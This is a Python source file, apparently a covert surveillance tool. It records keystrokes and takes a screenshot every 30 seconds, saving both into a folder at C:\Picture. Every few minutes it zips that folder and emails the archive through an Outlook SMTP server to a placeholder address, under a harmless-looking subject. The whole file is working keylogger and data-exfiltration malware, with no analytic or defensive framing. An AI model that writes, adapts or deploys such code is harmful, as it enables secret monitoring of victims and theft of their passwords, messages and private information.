import os
import pyautogui
import time
import threading
import glob
import zipfile
import smtplib
from pynput.keyboard import Key, Listener
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

if os.path.exists("C:\\Picture\\"):
    zipfile.ZipFile("C:\\Picture\\archive.zip", "w")
    pass
else:
    os.mkdir('C:\\Picture')
    os.mkdir('C:\\Picture\\Default')
    zipfile.ZipFile("C:\\Picture\\archive.zip", "w")
    pass

keys = []
count = 0
def keyboard():
    count = 0
    keys = []
    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1
    
        if count >= 10:
            write_file(keys)
            keys = []
            count = 0
    
    def write_file(keys):
        with open("C:\\Picture\\Default\\logs.txt", "a") as file:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write("\n")
                elif k.find("Key"):
                    file.write(str(k))
    
    def on_release(key):
        if key == Key.esc:
            return False
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
def ss():
        threading.Timer(30.0, ss).start()
        screenshot = pyautogui.screenshot()
        file_name = str(time.time_ns()) + ".jpg"
        file_path = os.path.join('C:\\Picture\\Default', file_name)
        screenshot.save(file_path)

def compress():
    files_to_compress = []
    threading.Timer(280.0, compress).start()
    for document in glob.iglob("C:\\Picture\\Default\\**/*", recursive=True):
        files_to_compress.append(document)
    with zipfile.ZipFile("C:\\Picture\\archive.zip", "w") as archive:
        for file in files_to_compress:
            archive.write(file)
        
def send_mail():
    threading.Timer(300.0, send_mail).start()
    sender_address = "sendmail"
    recipient_address = "receivermail"

    msg = MIMEMultipart()
    msg['from'] = sender_address
    msg['to'] = recipient_address
    msg['Subject'] = "Some Important Documents"

    subject = "You can find the attached files below: "
    msg.attach(MIMEText(subject, 'plain'))
    file_name = "archive.zip"
    attachment = open("C:\\Picture\\archive.zip", "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % file_name)

    msg.attach(part)

    server = smtplib.SMTP('smtp.outlook.com', 587)
    server.starttls()
    server.login(sender_address, "sendmail-password")
    text = msg.as_string()
    server.sendmail(sender_address, recipient_address, text)
    server.quit()

if __name__ == '__main__':
    t1 = threading.Thread(target=keyboard)
    t2 = threading.Thread(target=ss)
    t3 = threading.Thread(target=compress)
    t4 = threading.Thread(target=send_mail)
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    
#onurkaya

